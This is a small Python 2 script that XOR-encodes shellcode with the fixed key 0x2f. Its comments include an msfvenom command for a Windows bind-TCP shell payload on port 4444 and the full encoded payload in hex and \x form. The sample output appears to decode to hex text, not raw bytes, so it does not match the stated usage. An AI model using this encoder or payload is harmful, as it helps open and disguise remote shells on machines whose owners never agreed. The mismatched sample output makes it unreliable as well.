# Simple XOR Shellcode encoder
# Author:  w4fz5uck5
# msfvenom -p windows/shell/bind_tcp lport=4444 -f raw > shell.bin
# python xor_enc.py s.bin                                                                    [±master ●]
# ----------------------------------------
# HEX:
# 494c4a17171d1f1f1f1f1f1f191f17164a1a1c1e4c1f191b174d1a1f1c1f174d1a1d1f4c174d1a1d1e1b174d181d1d171f494d181b4e1d191c1e49494e4c1c4c191e184c1f1d1d4c1d1f4c1e4c491f4b1f1e4c184a1d491d1a1d1a18174d1a1d1e1f174d1b4e1c4c174d1b4c1e1e18174a1c1b171f1e4b1e1a1e174d1a161d1f1f1e4b1c174d1b161e174a1c1c4e1b16174d1c1b174d1f1e4b191c1e49494e4c4c1e4c491f4b1f1e4c181c174a1f181a49191f1c184b49171c4d184b1d1b181a4a1b1a17174d1a171d1b1f1e4b1c1919174d1f4c1b4d174d1a171e4c1f1e4b1c174d1f1b174d1f1e4b1f17161b1b1d1b1d1b1a4d1a4d191e1a161a4e1a1e49494a1f1a491a491a4e174d1e1d4a4d174b1a4b19171c1c1c1d1f1f1f1f19171818181c1c1d1a491a1b19171b4c18181d191f1849494b1a4d17161f1f1e1f1f1f1f1d164c1b1a1b1a1f19171d16171f194d1f1f49494b1a1a1f1a1f1a1f1a1f1b1f1a1f1b1f1a1f19174a4e1f494b494a1f49494b1a1618194e1f1a19174c1f4e171f1f191619171f1d1f1f1e1e1a4c17164a19194e1e1f1a191a18191716164e1a181b191e49494b1a171a4c1f181b1f4c49491b4a1f17181a4a4c1917491f4d1a4e1d1a1949494b1a1917191c194b191b1f1f17164a1c1a181a181a181c1e4919194e1e1d1a161a194a1d494b19194c181b1b1d1b1c4c1f1e1f1e174b1b1b1d1b1e1f4c191f1f1b1b1a1b1a1f1a191a191a191b191a191b4a1a191a191a1c1a19191718164c4c1c49171949494b1a17164a1f1b4a1a191b1949491c1f19171f1717181e4b191f49494b1a4d4d491f4d1a4e1d1a1919174e19161a4d4b164b49494b1a1c4c1f19184c1f4e171f494d4a1f181a1f1a4d4d1b181e1c181d1949194e1f1f1a1c49494b1a
# ----------------------------------------
# Shellcode format:
# \x49\x4c\x4a\x17\x17\x1d\x1f\x1f\x1f\x1f\x1f\x1f\x19\x1f\x17\x16\x4a\x1a\x1c\x1e\x4c\x1f\x19\x1b\x17\x4d\x1a\x1f\x1c\x1f\x17\x4d\x1a\x1d\x1f\x4c\x17\x4d\x1a\x1d\x1e\x1b\x17\x4d\x18\x1d\x1d\x17\x1f\x49\x4d\x18\x1b\x4e\x1d\x19\x1c\x1e\x49\x49\x4e\x4c\x1c\x4c\x19\x1e\x18\x4c\x1f\x1d\x1d\x4c\x1d\x1f\x4c\x1e\x4c\x49\x1f\x4b\x1f\x1e\x4c\x18\x4a\x1d\x49\x1d\x1a\x1d\x1a\x18\x17\x4d\x1a\x1d\x1e\x1f\x17\x4d\x1b\x4e\x1c\x4c\x17\x4d\x1b\x4c\x1e\x1e\x18\x17\x4a\x1c\x1b\x17\x1f\x1e\x4b\x1e\x1a\x1e\x17\x4d\x1a\x16\x1d\x1f\x1f\x1e\x4b\x1c\x17\x4d\x1b\x16\x1e\x17\x4a\x1c\x1c\x4e\x1b\x16\x17\x4d\x1c\x1b\x17\x4d\x1f\x1e\x4b\x19\x1c\x1e\x49\x49\x4e\x4c\x4c\x1e\x4c\x49\x1f\x4b\x1f\x1e\x4c\x18\x1c\x17\x4a\x1f\x18\x1a\x49\x19\x1f\x1c\x18\x4b\x49\x17\x1c\x4d\x18\x4b\x1d\x1b\x18\x1a\x4a\x1b\x1a\x17\x17\x4d\x1a\x17\x1d\x1b\x1f\x1e\x4b\x1c\x19\x19\x17\x4d\x1f\x4c\x1b\x4d\x17\x4d\x1a\x17\x1e\x4c\x1f\x1e\x4b\x1c\x17\x4d\x1f\x1b\x17\x4d\x1f\x1e\x4b\x1f\x17\x16\x1b\x1b\x1d\x1b\x1d\x1b\x1a\x4d\x1a\x4d\x19\x1e\x1a\x16\x1a\x4e\x1a\x1e\x49\x49\x4a\x1f\x1a\x49\x1a\x49\x1a\x4e\x17\x4d\x1e\x1d\x4a\x4d\x17\x4b\x1a\x4b\x19\x17\x1c\x1c\x1c\x1d\x1f\x1f\x1f\x1f\x19\x17\x18\x18\x18\x1c\x1c\x1d\x1a\x49\x1a\x1b\x19\x17\x1b\x4c\x18\x18\x1d\x19\x1f\x18\x49\x49\x4b\x1a\x4d\x17\x16\x1f\x1f\x1e\x1f\x1f\x1f\x1f\x1d\x16\x4c\x1b\x1a\x1b\x1a\x1f\x19\x17\x1d\x16\x17\x1f\x19\x4d\x1f\x1f\x49\x49\x4b\x1a\x1a\x1f\x1a\x1f\x1a\x1f\x1a\x1f\x1b\x1f\x1a\x1f\x1b\x1f\x1a\x1f\x19\x17\x4a\x4e\x1f\x49\x4b\x49\x4a\x1f\x49\x49\x4b\x1a\x16\x18\x19\x4e\x1f\x1a\x19\x17\x4c\x1f\x4e\x17\x1f\x1f\x19\x16\x19\x17\x1f\x1d\x1f\x1f\x1e\x1e\x1a\x4c\x17\x16\x4a\x19\x19\x4e\x1e\x1f\x1a\x19\x1a\x18\x19\x17\x16\x16\x4e\x1a\x18\x1b\x19\x1e\x49\x49\x4b\x1a\x17\x1a\x4c\x1f\x18\x1b\x1f\x4c\x49\x49\x1b\x4a\x1f\x17\x18\x1a\x4a\x4c\x19\x17\x49\x1f\x4d\x1a\x4e\x1d\x1a\x19\x49\x49\x4b\x1a\x19\x17\x19\x1c\x19\x4b\x19\x1b\x1f\x1f\x17\x16\x4a\x1c\x1a\x18\x1a\x18\x1a\x18\x1c\x1e\x49\x19\x19\x4e\x1e\x1d\x1a\x16\x1a\x19\x4a\x1d\x49\x4b\x19\x19\x4c\x18\x1b\x1b\x1d\x1b\x1c\x4c\x1f\x1e\x1f\x1e\x17\x4b\x1b\x1b\x1d\x1b\x1e\x1f\x4c\x19\x1f\x1f\x1b\x1b\x1a\x1b\x1a\x1f\x1a\x19\x1a\x19\x1a\x19\x1b\x19\x1a\x19\x1b\x4a\x1a\x19\x1a\x19\x1a\x1c\x1a\x19\x19\x17\x18\x16\x4c\x4c\x1c\x49\x17\x19\x49\x49\x4b\x1a\x17\x16\x4a\x1f\x1b\x4a\x1a\x19\x1b\x19\x49\x49\x1c\x1f\x19\x17\x1f\x17\x17\x18\x1e\x4b\x19\x1f\x49\x49\x4b\x1a\x4d\x4d\x49\x1f\x4d\x1a\x4e\x1d\x1a\x19\x19\x17\x4e\x19\x16\x1a\x4d\x4b\x16\x4b\x49\x49\x4b\x1a\x1c\x4c\x1f\x19\x18\x4c\x1f\x4e\x17\x1f\x49\x4d\x4a\x1f\x18\x1a\x1f\x1a\x4d\x4d\x1b\x18\x1e\x1c\x18\x1d\x19\x49\x19\x4e\x1f\x1f\x1a\x1c\x49\x49\x4b\x1a
# ----------------------------------------

import sys
key = 0x2f
shellcodeF = open(sys.argv[1], "r").read()

print "----------------------------------------"
print "HEX:"
print "".join(chr(ord(i) ^ key).encode("hex") for i in shellcodeF)
print "----------------------------------------"
print "Shellcode format:"
print "\\x" + "\\x".join(chr(ord(i) ^ key).encode("hex") for i in shellcodeF)
print "----------------------------------------"
